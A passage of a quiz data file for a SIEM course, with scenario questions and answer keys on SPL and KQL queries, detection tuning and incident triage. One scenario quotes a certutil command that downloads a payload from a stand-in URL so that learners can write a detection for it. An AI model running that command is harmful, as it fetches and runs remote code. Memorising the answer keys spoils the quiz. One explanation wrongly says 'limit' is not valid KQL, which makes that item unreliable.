          "index=network [search index=alerts severity=high earliest=@d | fields src_ip] | stats count by src_ip",
          "index=network | where src_ip IN (search index=alerts severity=high earliest=@d | project src_ip)",
          "index=network [search index=alerts severity=high earliest=@d | stats values(src_ip) AS src_ip | table src_ip]"
        ],
        correctAnswer: 3,
        explanation: "A subsearch returning a list of IPs (D) acts as an efficient inline filter at search start. (A) uses join which is slow. (B) performs an unnecessary stats aggregation. (C) uses invalid KQL-like syntax in Splunk."
      },
      {
        id: "siem-q3-12",
        difficulty: "easy",
        tags: ["KQL"],
        scenario: "You want to limit a noisy KQL query to the 20 most recent rows for quick inspection.",
        question: "Which is correct?",
        options: [
          "SigninLogs | limit 20",
          "SigninLogs | top 20 by TimeGenerated desc",
          "SigninLogs | take 20",
          "SigninLogs | head 20"
        ],
        correctAnswer: 1,
        explanation: "Using 'top 20 by TimeGenerated desc' (B) explicitly sorts and retrieves the 20 most recent records. (C) retrieves 20 arbitrary, non-guaranteed records. (A) and (D) are Splunk commands, not valid KQL."
      },
      {
        id: "siem-q3-13",
        difficulty: "medium",
        tags: ["SPL", "Regex"],
        scenario: "URLs are buried in proxy raw events. You want a field 'domain' extracted in-flight without an admin-side parser change.",
        question: "Which SPL works?",
        options: [
          "index=proxy | eval domain = mvindex(split(url, \"/\"), 2)",
          "index=proxy | spath input=url output=domain",
          "index=proxy | rex field=_raw \"https?://(?<domain>[^/]+)\"",
          "index=proxy | extract domain from url"
        ],
        correctAnswer: 2,
        explanation: "The 'rex' command (C) extracts fields from raw data or existing fields using regular expressions. (A) is brittle and fails on complex URLs. (B) is for JSON/XML parsing. (D) is syntactically invalid."
      },
      {
        id: "siem-q3-14",
        difficulty: "hard",
        tags: ["KQL", "Performance"],
        scenario: "A KQL query over 30 days of SecurityEvent times out. You really need 30 days.",
        question: "Best optimization path?",
        options: [
          "Narrow at the source: project away unused columns early, apply filters first, and use materialized views or hourly summaries.",
          "Run the query during non-business hours and increase the Sentinel query timeout limit to 8 hours.",
          "Export the raw data to a local CSV file and perform the aggregation using a Python script.",
          "Split the query into 30 individual daily queries and manually merge the results in Excel."
        ],
        correctAnswer: 0,
        explanation: "Applying filters early, projecting only necessary columns, and using pre-aggregated data (A) are the best practices for large KQL queries. (B) and (D) are operational bypasses, and (C) is inefficient."
      },
      {
        id: "siem-q3-15",
        difficulty: "hard",
        tags: ["SPL", "Detection"],
        scenario: "You want: 'Service account whose number of distinct destination hosts in 1h > 5x its 7-day median' (lateral-movement signal).",
        question: "Sketch the SPL pattern.",
        options: [
          "index=auth account_type=service earliest=-1h | stats dc(dest_host) AS hosts_1h by user | where hosts_1h > 5",
          "index=auth account_type=service | stats dc(dest_host) as unique_hosts by user | eventstats avg(unique_hosts) as avg_hosts",
          "index=auth account_type=service earliest=-1h | stats dc(dest_host) AS hosts_1h by user | join user [search index=auth account_type=service earliest=-7d@d latest=@d | bucket _time span=1h | stats dc(dest_host) AS h by user _time | stats median(h) AS median_hosts by user] | where hosts_1h > 5 * median_hosts",
          "index=auth | stats count by user dest_host | eventstats median(count) as med by user | where count > 5 * med"
        ],
        correctAnswer: 2,
        explanation: "The correct SPL (C) calculates the current 1h window host count, runs a subsearch over the last 7 days to calculate the 1h median per user, joins them, and checks if the current count exceeds 5x the median."
      },
      {
        id: "siem-q3-16",
        difficulty: "medium",
        tags: ["KQL", "let / functions"],
        scenario: "You repeat the same 'risky user list' subquery in five Sentinel rules.",
        question: "Cleanest way to centralize?",
        options: [
          "Maintain a static list of hardcoded usernames within each of the five Sentinel rules and update them weekly.",
          "Save the subquery as a saved KQL function; each rule calls the function, maintaining the definition in one place.",
          "Duplicate the subquery logic across all rules and document the copy-paste procedure in the team runbook.",
          "Disable four of the rules and rely on a single consolidated rule that alerts on any activity from the user list."
        ],
        correctAnswer: 1,
        explanation: "KQL functions promote DRY (Don't Repeat Yourself) design (B). Centralizing the subquery in a function ensures that updates propagate automatically. Hardcoding (A) or copying (C) introduces drift and maintenance overhead."
      },
      {
        id: "siem-q3-17",
        difficulty: "easy",
        tags: ["SPL"],
        scenario: "Your SPL: index=web | stats count by status. You want descending sort by count.",
        question: "Correct addition?",
        options: [
          "index=web | stats count by status | order count desc",
          "index=web | stats count by status | sort -count",
          "index=web | stats count by status | sort count",
          "index=web | stats count by status | desc count"
        ],
        correctAnswer: 1,
        explanation: "The '-' prefix in Splunk's 'sort' command (B) sorts the specified field in descending order. (A) uses invalid 'order' command. (C) sorts in ascending order. (D) is invalid syntax."
      },
      {
        id: "siem-q3-18",
        difficulty: "hard",
        tags: ["SPL", "tstats"],
        scenario: "You need a fast count of distinct src_ip per hour over 30 days for a dashboard.",
        question: "Which is dramatically faster?",
        options: [
          "| tstats summariesonly=true dc(All_Traffic.src) FROM datamodel=Network_Traffic.All_Traffic BY _time span=1h",
          "index=fw | stats dc(src_ip) by date_hour | addtotals",
          "index=fw | bucket _time span=1h | stats dc(src_ip) by _time",
          "| metasearch index=fw | bucket _time span=1h | stats dc(src_ip) by _time"
        ],
        correctAnswer: 0,
        explanation: "The 'tstats' command (A) queries accelerated datamodels directly rather than raw indexes, providing orders-of-magnitude speedups on large datasets. (B) and (C) scan raw events, which is slow over 30 days."
      },
      {
        id: "siem-q3-19",
        difficulty: "medium",
        tags: ["KQL", "parse"],
        scenario: "A free-text Message field contains:\n  \"User jdoe logged in from 10.4.7.22 (session 9c1f)\"\nYou want extracted columns user, ip, session.",
        question: "Which KQL operator fits?",
        options: [
          "| rex field=Message \"User (?<user>\\w+) logged in from (?<ip>[\\d.]+) \\(session (?<session>\\w+)\\)\"",
          "| extend user = extract(\"User (\\w+)\", Message), ip = extract(\"from ([\\d.]+)\", Message)",
          "| project Message | parse-text Message into user, ip, session",
          "| parse Message with 'User ' user ' logged in from ' ip ' (session ' session ')'"
        ],
        correctAnswer: 3,
        explanation: "The 'parse' operator in KQL (D) extracts structured columns from unstructured strings using a pattern template. (A) is Splunk SPL syntax. (B) uses invalid KQL syntax. (C) is invalid."
      },
      {
        id: "siem-q3-20",
        difficulty: "hard",
        tags: ["Detection Engineering"],
        scenario: "Final check before promoting a new rule to prod: it fires 3 times in the last 24h of test data — all 3 are true positives in your sample.",
        question: "Is it ready?",
        options: [
          "Run a backtest against 24 hours of logs, confirm a 100% precision rate, and deploy immediately to production.",
          "Deploy the rule in monitor-only mode and alert the on-call team for every execution to test response times.",
          "Submit the query directly to the production SIEM alert library and schedule a review in six months.",
          "Run it against ≥ 30 days of production telemetry, measure the alert rate, document a runbook, and deploy in monitor-only/staging mode."
        ],
        correctAnswer: 3,
        explanation: "Deploying a detection requires testing against historical data (D) (to assess volume and false-positive rates), creating a runbook, and staging in monitor-only/silent mode to ensure stability before going live."
      }
    ]
  },
  {
    quizId: "siem-q4",
    courseId: "siem-fundamentals",
    title: "Alert Tuning & Detection Quality",
    description: "Scenario quiz on building, tuning, and operating high-fidelity detections.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "siem-q4-1",
        difficulty: "medium",
        tags: ["FP Reduction"],
        scenario: "Rule 'Multiple Failed Logons' fires 1,200x/day. Triage shows: 95% from a vuln scanner (known IP), 4% from a misconfigured backup agent (known account), <1% true positives.",
        question: "What is the most effective tuning approach to reduce volume while maintaining visibility?",
        options: [
          "Disable the alerting rule entirely across all subnets until the scanner and backup agent configurations are fully resolved.",
          "Add explicit exceptions for known sources, document owners, and review dates so actual brute-force attempts still trigger.",
          "Increase the rule threshold to 10,000 alerts per day to silence the scanner noise while keeping the rule active.",
          "Instruct the SOC analyst team to manually mark scanner alerts as benign false positives at the end of each shift."
        ],
        correctAnswer: 1,
        explanation: "Targeted suppression of known-benign sources (B) reduces volume without creating blind spots. Disabling rules (A) or ignoring alerts (D) leaves the organization unprotected. Raising thresholds (C) blindly masks actual attacks."
      },
      {
        id: "siem-q4-2",
        difficulty: "hard",
        tags: ["Detection Lifecycle"],
        scenario: "Your detection library has 412 rules. 60% of them have not fired in 12 months. The team debates: 'kill the silent ones' vs 'they're insurance, keep them.'",
        question: "How should you evaluate these dormant detection rules?",
        options: [
          "Retain all 412 rules permanently, as any deletion risks creating critical gaps in threat detection coverage.",
          "Delete all rules that have not fired in the last year to optimize search performance and reduce SIEM workload.",
          "Perform a triage audit checking for log ingestion, semantic logic correctness, and threat relevance before deciding whether to retire them.",
          "Deactivate half of the silent rules at random and monitor the environment for any new undetected threat activity."
        ],
        correctAnswer: 2,
        explanation: "A structured audit (C) confirms whether silence is due to lack of attacks, broken log collection, or parser errors. Bulk retention (A) hides broken rules, and bulk deletion (B) or random disabling (D) creates unmeasured gaps."
      },
      {
        id: "siem-q4-3",
        difficulty: "medium",
        tags: ["Severity"],
        scenario: "A new rule 'PowerShell EncodedCommand executed' fires on every admin script (mostly benign) AND on real attacker tradecraft.",
        question: "How do you handle this noise without losing critical alerts?",
        options: [
          "Implement risk-based scoring to escalate severity dynamically only when correlated with high-risk signals or sensitive assets.",
          "Apply a critical severity level to ensure the SOC analyst team is immediately paged for every single alert execution.",
          "Permanently disable the rule to eliminate the false-positive volume and rely on endpoint antivirus alerts instead.",
          "Email all daily alert logs directly to the SOC manager's inbox for weekly manual review and correlation."
        ],
        correctAnswer: 0,
        explanation: "Risk-based alerting (A) combines low-fidelity signals with contextual risk scores (e.g., asset value, concurrent alerts) before paging. Constant paging (B) causes fatigue, disabling (C) misses attacks, and emails (D) delay response."
      },
      {
        id: "siem-q4-4",
        difficulty: "medium",
        tags: ["Throttling"],
        scenario: "Same rule fires 400 times in 10 minutes from the SAME src_ip during an obvious scan. Your on-call gets 400 pages.",
        question: "What is the best mechanism to handle this alert storm?",
        options: [
          "Disable the alerting rule entirely for one hour while the scan runs to prevent analyst fatigue.",
          "Lower the global severity setting of the rule to prevent it from paging the on-call engineer.",
          "Instruct the on-call team to ignore incoming alerts from that specific IP address until the scan finishes.",
          "Configure throttling to generate one alert per source IP every 30 minutes, preserving event totals."
        ],
        correctAnswer: 3,
        explanation: "Throttling (D) collapses alert storms into a single actionable ticket while preserving total event counts for forensics. Disabling the rule (A), lowering severity (B), or ignoring alerts (C) compromises perimeter visibility."
      },
      {
        id: "siem-q4-5",
        difficulty: "hard",
        tags: ["ATT&CK Coverage"],
        scenario: "Leadership asks: 'How good is our detection coverage?' You have 200 rules.",
        question: "What is the most accurate way to represent your organization's detection posture?",
        options: [
          "Map rules to MITRE ATT&CK techniques and present a heatmap showing covered vs. uncovered threats based on organizational risk.",
          "Provide a detailed dashboard screenshot showing current SIEM system uptime and daily database ingestion statistics.",
          "Report the total number of rules active in the system alongside the average daily alert volume generated.",
          "List all 200 rules in an alphabetical spreadsheet and highlight the ones that fired at least once in the past month."
        ],
        correctAnswer: 0,
        explanation: "Mapping to MITRE ATT&CK (A) visualizes coverage breadth against a standardized threat framework. Raw rule counts (C) or volume (B) are vanity metrics, and list activity (D) does not show risk alignment."
      },
      {
        id: "siem-q4-6",
        difficulty: "medium",
        tags: ["Alert Quality"],
        scenario: "Two alerts arrive simultaneously: Alert A: 'Suspicious activity on host01.' Alert B: 'PowerShell encoded download from winword.exe on CFO laptop. Confidence: 0.94.'",
        question: "Which represents a better-built alert and why?",
        options: [
          "Alert A, because shorter alert names allow analysts to scan and respond to tickets more quickly.",
          "Alert A, because it leaves investigative options open without bias, allowing the analyst to make a judgment.",
          "Alert B, because it provides necessary context like technique mapping, asset value, and parent process lineage for faster triage.",
          "They are equivalent, as both alerts have been assigned a 'High' severity status by the SIEM deployment."
        ],
        correctAnswer: 2,
        explanation: "High-fidelity alerts (C) package vital context (MITRE technique, asset severity, process lineage) for rapid triage. Vague alerts like Alert A (A/B) waste critical response time on basic data gathering."
      },
      {
        id: "siem-q4-7",
        difficulty: "easy",
        tags: ["Runbook"],
        scenario: "An analyst opens an alert and has no idea what to do next.",
        question: "What operational artifact is missing?",
        options: [
          "Migrate to a larger SIEM platform with more automated detection and response capabilities.",
          "Create a comprehensive runbook outlining triage steps, escalation paths, and remediation options.",
          "Increase the severity level of the alert to ensure it is immediately escalated to senior engineers.",
          "Configure the alert to trigger multiple times to ensure the analyst notices the activity."
        ],
        correctAnswer: 1,
        explanation: "A dedicated runbook (B) provides step-by-step guidance for triage, ensuring consistent response. Upgrades (A) or increasing severity (C) do not solve operational process gaps."
      },
      {
        id: "siem-q4-8",
        difficulty: "hard",
        tags: ["Risk-Based Alerting"],
        scenario: "Instead of paging on every notable, you accumulate risk events on entities. A user with 5 medium notables in 24h pages; a user with 1 high notable also pages.",
        question: "What is the name and benefit of this architectural approach?",
        options: [
          "It is standard alert throttling, intended to reduce license usage and system database queries.",
          "It is a legacy security practice that has been deprecated in modern distributed SOC environments.",
          "It is a static threshold rule, designed to alert on any single event regardless of asset risk.",
          "It is Risk-Based Alerting, designed to surface multi-step attacks and reduce analyst burnout."
        ],
        correctAnswer: 3,
        explanation: "Risk-Based Alerting (D) scores risk on entities (users/hosts) over time, surfacing low-and-slow attacks and reducing false positives. It is not simple throttling (A) or legacy (B)."
      },
      {
        id: "siem-q4-9",
        difficulty: "medium",
        tags: ["FP Pattern"],
        scenario: "Your 'Mass File Access' rule fires every Monday morning on 'svc-backup'. Always benign.",
        question: "What is the most precise fix for this false positive?",
        options: [
          "Add a specific exception scoped to the account, the scheduled backup time window, and the relevant file paths.",
          "Suppress all alerts generated on Mondays since weekly backups make false positives highly likely.",
          "Disable the rule entirely since scheduled service accounts render the detection logic unreliable.",
          "Continue to page the analyst, as the rule might eventually catch a true positive lateral movement attempt."
        ],
        correctAnswer: 0,
        explanation: "Exceptions should be tightly scoped to the entity, time, and path (A). General suppressions (B) or disabling rules (C) invite attackers to hide in those unmonitored windows."
      },
      {
        id: "siem-q4-10",
        difficulty: "medium",
        tags: ["Detection KPI"],
        scenario: "You're asked for the single best metric to track detection quality over time.",
        question: "Which metric best reflects overall detection quality?",
        options: [
          "Total alert volume per day — more alerts indicate more active threat coverage and better monitoring.",
          "Alert fidelity (TP / (TP + FP)) tracked per rule, alongside MTTD and MTTR to show tuning effectiveness.",
          "Number of rules in the library — a larger rule count signals a more mature detection program.",
          "SIEM CPU and memory usage — healthy infrastructure performance underpins reliable alert execution."
        ],
        correctAnswer: 1,
        explanation: "Alert fidelity (B) measures how many alerts are true positives, indicating tuning effectiveness. Daily volume (A) and rule counts (C) are misleading metrics that encourage noisy, untuned libraries."
      }
    ]
  },
  {
    quizId: "siem-q5",
    courseId: "siem-fundamentals",
    title: "SIEM Fundamentals — Final Exam",
    description: "Comprehensive scenario-based exam covering architecture, onboarding, query, detection, and operations.",
    passingScore: 80,
    timeLimit: 45,
    questions: [
      {
        id: "siem-q5-1",
        difficulty: "medium",
        tags: ["Triage", "Brute Force"],
        scenario: "07:42 — Alert fires: 500 failed logons against acct 'admin' from 1 source IP in 10 minutes, followed by 1 SUCCESS from the same IP for the same account. The src_ip is external.",
        question: "What is the correct first action?",
        options: [
          "Isolate the host, force account re-auth, search for downstream host access starting from the success timestamp, and escalate to IR.",
          "Wait for additional corroborating security alerts to execute before taking containment actions on the active user account.",
          "Reset the target account password immediately and close the SIEM ticket as resolved without additional scoping.",
          "Block the external source IP address at the perimeter firewall interface and mark the alert as resolved on the dashboard."
        ],
        correctAnswer: 0,
        explanation: "Brute-force followed by success means the attacker is in. Password reset alone (C) or perimeter blocking (D) does not kill active sessions. Containment + scope (where else has this account authenticated since the success?) (A) is the correct sequence."
      },
      {
        id: "siem-q5-2",
        difficulty: "hard",
        tags: ["SPL"],
        scenario: "Write SPL for: top 10 external src_ips by count of distinct internal users they attempted to authenticate as (failed) in the last 24h.",
        question: "Which SPL query is most accurate?",
        options: [
          "index=auth action=failure src_ip=10.0.0.0/8 | stats count by src_ip | sort -count | head 10",
          "index=* failed earliest=-24h | stats values(user) by src_ip | sort -values(user) | head 10",
          "index=auth earliest=-24h NOT src_ip IN (10.0.0.0/8) | stats count(user) by src_ip | head 10",
          "index=auth action=failure earliest=-24h NOT src_ip IN (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) | stats dc(user) AS unique_users by src_ip | sort -unique_users | head 10"
        ],
        correctAnswer: 3,
        explanation: "The correct SPL (D) filters failures, excludes RFC1918 (external only), uses dc(user) to find password-spraying fingerprints (distinct users hit), sorts, and heads. (A) includes internal IPs. (B) lacks failure logic. (C) counts total events, not distinct users."
      },
      {
        id: "siem-q5-3",
        difficulty: "medium",
        tags: ["KQL", "Impossible Travel"],
        scenario: "Sentinel alert: 'Impossible travel' — user signed in from Mumbai 14:02 IST, then São Paulo 14:31 IST.",
        question: "Before paging IR, what is the mandatory first triage step?",
        options: [
          "Disable the user account immediately to prevent any potential credential abuse until the user reports the issue.",
          "Dismiss the alert as a false positive since impossible travel alerts are typically caused by user VPN usage.",
          "Check for known corporate VPN or proxy egress, UserAgent/device identity, MFA details, and Conditional Access risk scores.",
          "Reset the user's password without notification and request a manual confirmation via their supervisor's office."
        ],
        correctAnswer: 2,
        explanation: "Impossible-travel has a high benign-rate (VPNs, mobile carriers, satellite). Checking VPN/proxy/device/MFA context (C) is mandatory triage. Both blind containment (A/D) and blind dismissal (B) are wrong."
      },
      {
        id: "siem-q5-4",
        difficulty: "medium",
        tags: ["Exfiltration"],
        scenario: "Possible data exfiltration suspected for user 'jdoe'. Which combination of SIEM data sources gives the strongest case?",
        question: "Which data source combination is most comprehensive?",
        options: [
          "Email logs only, since email is the primary outbound exfiltration channel and provides complete visibility.",
          "CloudTrail API logs only, since cloud storage downloads capture all data movement in modern enterprise assets.",
          "Active Directory authentication logs, since credential reuse patterns provide the strongest signal of threat intent.",
          "Proxy/firewall outbound flows, DLP alerts, EDR file-access and USB events, CASB uploads, and DNS — correlated by user and host."
        ],
        correctAnswer: 3,
        explanation: "Exfil paths are diverse — corporate email, personal webmail, SaaS, USB, DNS tunneling, cloud sync. A defensible case correlates network + endpoint + identity + DLP (D). Single-source theories (A/B/C) are easy to refute."
      },
      {
        id: "siem-q5-5",
        difficulty: "hard",
        tags: ["IR Timeline"],
        scenario: "You're rebuilding an incident timeline. Events come from EDR, firewall, proxy, AD, and Okta — all with different timestamp formats and some in local TZ.",
        question: "What is the critical preparation step before merging the timeline?",
        options: [
          "Sort all events by database ingest_time to establish a sequence of when logs arrived at the SIEM platform.",
          "Convert all timestamps to the local timezone of the security team to simplify analyst inspection of logs.",
          "Normalize ALL timestamps to UTC at event_time before merging; verify NTP sync; flag any clock-drift over 60 seconds.",
          "Rely on log sequence numbers provided by individual servers to determine absolute event order without time sync."
        ],
        correctAnswer: 2,
        explanation: "Timeline integrity stands on consistent event-time in UTC (C). Mixed TZ + clock drift = misleading attack narrative. Ingest_time (A) tells you when the SIEM received it, not when it happened."
      },
      {
        id: "siem-q5-6",
        difficulty: "medium",
        tags: ["Notable Event", "Splunk ES"],
        scenario: "In Splunk ES, a correlation search produces a notable event. The analyst clicks it in Incident Review.",
        question: "What is a notable event in Splunk ES?",
        options: [
          "A raw log line pulled directly from the underlying index for the analyst to review and parse manually.",
          "A higher-order security event derived from one or more raw events by a correlation search, with status, severity, and owner.",
          "A visual dashboard panel showing trend charts for a particular sourcetype over the last 24 hours.",
          "A scheduled report that runs nightly and emails a summary of authentication events to the SOC team."
        ],
        correctAnswer: 1,
        explanation: "Notables in ES (B) are first-class objects representing actionable security events. They are the surface the SOC works against, not the raw log (A) or dashboard panels (C)."
      },
      {
        id: "siem-q5-7",
        difficulty: "easy",
        tags: ["Retention"],
        scenario: "Compliance says 'keep audit logs 1 year.' Your hot tier holds 30 days, warm 90 days, cold 365.",
        question: "Are you compliant with a tiered storage architecture?",
        options: [
          "No — compliance requires all audit logs to be stored in hot-tier storage for immediate retrieval at any time.",
          "No — the tiered approach creates gaps in searchability that will fail standard regulatory compliance audits.",
          "Yes — the total retention envelope with cold-tier search and restore capability satisfies the 1-year requirement.",
          "Only if the cold tier can restore data within 24 hours and the vendor provides a written SLA guarantee."
        ],
        correctAnswer: 2,
        explanation: "Compliance cares about retention duration + retrievability, not which tier. The tiered storage architecture (C) satisfies the 1-year requirement. Auditors accept tiered storage."
      },
      {
        id: "siem-q5-8",
        difficulty: "hard",
        tags: ["Detection Engineering"],
        scenario: "A new threat blog drops: 'Adversary uses certutil.exe -urlcache -split -f http://x/y.exe to download payloads.' You need a detection by EOD.",
        question: "Which SPL provides the smallest, highest-fidelity detection?",
        options: [
          "index=* certutil — broad keyword search that will generate enormous noise from legitimate certutil admin usage.",
          "index=network http — monitors HTTP traffic but misses the process context needed to confirm certutil abuse.",
          "index=endpoint sourcetype=Sysmon EventID=1 process_name=certutil.exe (commandline=*-urlcache* OR commandline=*-split*) commandline=*http*",
          "index=* | head 1000 — limits results to 1,000 events for a manual review of recent certutil usage."
        ],
        correctAnswer: 2,
        explanation: "Detection precision (C) targets the specific process name, command-line arguments, and network artifacts of the LOLBin threat. Broad keywords (A) or simple network matches (B) generate excessive noise."
      },
      {
        id: "siem-q5-9",
        difficulty: "medium",
        tags: ["Threat Intel"],
        scenario: "You ingest a commercial threat-intel feed of 'malicious IPs'. After a week, your alerts are flooded with hits on those IPs visiting your public website.",
        question: "Why is this happening and what is the correct fix?",
        options: [
          "Restrict TI matching to outbound traffic from internal hosts or inbound on non-public assets.",
          "Replace the threat intelligence feed with a different commercial feed to resolve accuracy issues.",
          "Purchase a larger threat intel feed with more IP addresses to improve coverage and reduce the false positive rate.",
          "Block every TI-listed IP address at the perimeter firewall to prevent scans on the public website."
        ],
        correctAnswer: 0,
        explanation: "TI value depends on direction and asset. Restricting matching to outbound traffic from internal hosts (A) filters out internet background noise (scanners) on public websites (B)."
      },
      {
        id: "siem-q5-10",
        difficulty: "medium",
        tags: ["SOAR"],
        scenario: "Your SIEM integrates with SOAR. A phishing-URL alert fires.",
        question: "What is the most effective SOAR automation strategy?",
        options: [
          "Auto-delete the user's mailbox immediately to prevent any further interaction with the phishing message.",
          "Page the CEO and CISO immediately so that executive leadership can make a containment decision directly.",
          "Auto-disable the recipient's account immediately to prevent the user from clicking any links in the message.",
          "Auto-enrich (sandbox URL, pull reputation, search Exchange for recipients), then propose analyst-approved bulk remediation."
        ],
        correctAnswer: 3,
        explanation: "SOAR automation should execute reversible enrichment tasks first, leaving irreversible actions like account disablement or mailbox deletes to analyst approval (D). This protects against automated outages (A/B/C)."
      },
      {
        id: "siem-q5-11",
        difficulty: "hard",
        tags: ["Lateral Movement"],
        scenario: "EDR shows a user account 'jdoe' authenticating to 27 distinct hosts in 12 minutes from a single workstation. jdoe is a helpdesk technician (so some breadth is normal).",
        question: "What is the best discriminator between normal and compromised behavior?",
        options: [
          "Compare jdoe's 1h count to their own 30-day personal baseline AND to the helpdesk-cohort baseline.",
          "Total host count alone — 27 is above any reasonable threshold and should automatically trigger a page.",
          "Flag all helpdesk activity as potentially malicious since helpdesk accounts are high-value lateral movement targets.",
          "Always treat helpdesk authentication breadth as benign since it is expected behavior for that role by definition."
        ],
        correctAnswer: 0,
        explanation: "Comparing current behavior against personal and cohort baselines (A) distinguishes genuine helpdesk work from lateral movement. Static thresholds (B) cause alerts, and ignoring (D) leaves blind spots."
      },
      {
        id: "siem-q5-12",
        difficulty: "medium",
        tags: ["Health"],
        scenario: "Friday 22:00: the 'Critical Brute Force' detection has not fired in 5 days, but historically fired daily. SOC manager is pleased.",
        question: "What is the correct response to this sudden silence?",
        options: [
          "Send a congratulatory message to the team since the detection silence indicates successful threat reduction.",
          "Disable the rule temporarily since sustained silence may indicate the rule parameters are too restrictive.",
          "Lower the rule threshold to ensure it starts generating alerts again and can be monitored over the weekend.",
          "Open a detection health ticket and verify source ingestion health, parser field availability, and recent rule changes."
        ],
        correctAnswer: 3,
        explanation: "Sustained quiet on active detections should be treated as a pipeline health issue (D). Ingest failures or parsing changes can break detections silently. Congratulating the team (A) or lowering thresholds (C) is premature."
      },
      {
        id: "siem-q5-13",
        difficulty: "medium",
        tags: ["RBAC", "SIEM Admin"],
        scenario: "A Tier 1 analyst asks for permission to delete events from the index 'to clean up false positives'.",
        question: "What is the correct response?",
        options: [
          "Refuse — SIEM data is forensic evidence. Use exclusions and suppressions instead, keeping deletion rights restricted.",
          "Grant the request since cleaning up false positives improves dashboard quality and analyst efficiency.",
          "Grant the permission temporarily for 24 hours and then revoke it after the cleanup task is completed.",
          "Grant permission scoped to a single non-critical index to balance analyst needs with data integrity."
        ],
        correctAnswer: 0,
        explanation: "SIEM data must preserve forensic integrity. Deleting events (B/C/D) ruins audit trails. Use suppressions or lookup exclusions (A) to filter noise without destroying raw evidence."
      },
      {
        id: "siem-q5-14",
        difficulty: "hard",
        tags: ["Insider Threat"],
        scenario: "A finance user starts accessing source-control repos and S3 buckets they've never touched in 18 months — at 02:00 local time — 2 weeks before their resignation date (known to HR).",
        question: "What SIEM capability turns this into a usable signal?",
        options: [
          "A keyword alert that triggers whenever the word 'leaving' or 'resignation' appears in HR system records.",
          "Immediately disable all users on the departure list as a precautionary measure regardless of observed behavior.",
          "Avoid monitoring finance users since financial data access may trigger privacy compliance violations.",
          "UEBA + risk-based alerting: correlate HR status, baseline deviations, off-hours access, and asset sensitivity."
        ],
        correctAnswer: 3,
        explanation: "Insider threat detection relies on correlating HR leaver status, behavioral baseline shifts, and asset sensitivity (D). Simple keyword alerts (A) or mass account lockout (B) are operationally ineffective."
      },
      {
        id: "siem-q5-15",
        difficulty: "medium",
        tags: ["Cloud", "CloudTrail"],
        scenario: "CloudTrail event: a former contractor's API access key calls iam:CreateUser at 03:14 UTC. The contractor offboarded last week.",
        question: "What is the correct severity assessment and first action?",
        options: [
          "Low severity — the iam:CreateUser call is likely leftover automation and will self-resolve when the key is rotated.",
          "Critical — disable key immediately, audit 30-day key usage history, snapshot resources, and initiate incident response.",
          "Medium — monitor for additional IAM calls before escalating to avoid unnecessary IR resource consumption.",
          "Send an email to the former contractor to verify whether they still have authorized access to the environment."
        ],
        correctAnswer: 1,
        explanation: "Offboarded credentials performing administrative tasks indicates active credentials compromise. Immediate disablement and investigation (B) is required to contain the blast radius."
      },
      {
        id: "siem-q5-16",
        difficulty: "easy",
        tags: ["Sigma"],
        scenario: "A team-mate writes a new detection directly in Splunk SPL. Another writes the same logic in KQL for Sentinel. Both maintain their copies independently.",
        question: "What process improvement should you propose?",
        options: [
          "Standardize on Splunk SPL only and migrate all Sentinel workloads to Splunk to eliminate the duplication.",
          "Standardize on KQL only and build a Splunk-to-Sentinel migration plan to unify the detection library.",
          "Author detections in Sigma (vendor-neutral) in Git as the single source of truth, then compile to SPL and KQL via pySigma.",
          "Continue maintaining both copies manually with a quarterly sync review to catch any significant logical drift."
        ],
        correctAnswer: 2,
        explanation: "Authoring detections in Sigma (C) keeps the detection logic centralized in Git while automatically compiling it to vendor-specific syntax, preventing logic drift. Unifying platforms (A/B) or manual syncs (D) are costly."
      },
      {
        id: "siem-q5-17",
        difficulty: "hard",
        tags: ["Maturity"],
        scenario: "SOC A: 10 TB/day ingest, 1,200 vendor-default rules, no ATT&CK mapping, 4,000 alerts/day. SOC B: 2 TB/day, 280 custom Sigma-managed rules, ATT&CK-mapped with quarterly gap review, 60 RBA-paged alerts/day.",
        question: "Which SOC is more operationally mature?",
        options: [
          "SOC A — more data ingested and more rules deployed demonstrates a larger and more comprehensive security investment.",
          "They are equally mature — SOC A covers volume while SOC B covers quality, and both dimensions are important.",
          "SOC B — focused data, intentional detections aligned to threats, measured coverage, and sustainable analyst workload.",
          "Neither — a mature SOC requires at least 5 TB/day ingest and 500+ rules to achieve meaningful threat coverage."
        ],
        correctAnswer: 2,
        explanation: "SOC B's focus on quality, ATT&CK mapping, and sustainable workload (C) is the industry standard for maturity. High volume (A/D) is a vanity metric that typically indicates noisy, untuned detection engineering."
      },
      {
        id: "siem-q5-18",
        difficulty: "medium",
        tags: ["Investigation"],
        scenario: "You start with a single indicator — a suspicious external domain. You want every related event across all data sources.",
        question: "What is the tradecraft term for this technique and the correct SIEM workflow?",
        options: [
          "Pivoting — search across DNS, proxy, firewall, and EDR for the domain; identify hosts; then search their subsequent activity.",
          "Throttling — apply a suppression window to the domain indicator to reduce repeated alert noise during triage.",
          "Suppression — create a watchlist of the domain indicator to passively monitor for future appearances in log data.",
          "Normalization — map the domain indicator to a standard field schema across all data sources and compare results."
        ],
        correctAnswer: 0,
        explanation: "Pivoting (A) involves tracing an indicator across multiple telemetry sources to compile the complete intrusion path. Normalization (D) enables this, but pivoting is the investigative action."
      },
      {
        id: "siem-q5-19",
        difficulty: "hard",
        tags: ["Anti-Forensics", "1102"],
        scenario: "Windows Security Event ID 1102 ('audit log cleared') fires on a domain controller at 04:01 UTC. No scheduled maintenance.",
        question: "How should this be treated?",
        options: [
          "Treat as active intrusion (T1070.001); retrieve central SIEM logs, identify the logon session, isolate the DC, and engage IR.",
          "Low severity — an admin likely cleared the log during routine maintenance and forgot to schedule the change window.",
          "Ignore the event since audit log clearing is a normal administrative task and is expected on domain controllers.",
          "Reboot the domain controller to restore audit log integrity and monitor for any additional suspicious events."
        ],
        correctAnswer: 0,
        explanation: "Audit log clearing on a DC is a critical indicator of defense evasion (A). The analyst must pivot from the 1102 event to find the responsible session using central SIEM logs. Ignoring (B/C) or rebooting (D) is highly dangerous."
      },
      {
        id: "siem-q5-20",
        difficulty: "medium",
        tags: ["KQL", "Identity"],
        scenario: "Sentinel — find users whose sign-in succeeded with MFA satisfied but the MFA method was 'Phone call' from a high-risk country in the last 24h (possible MFA-fatigue or SIM-swap pattern).",
        question: "Which KQL filter chain is correct?",
        options: [
          "SigninLogs | take 100 — returns a sample of 100 recent sign-in rows for manual review.",
          "SigninLogs | where MFA == false — filters for sign-ins where MFA was not satisfied, not the target scenario.",
          "SigninLogs | summarize by AppDisplayName — groups events by application with no MFA or location filter.",
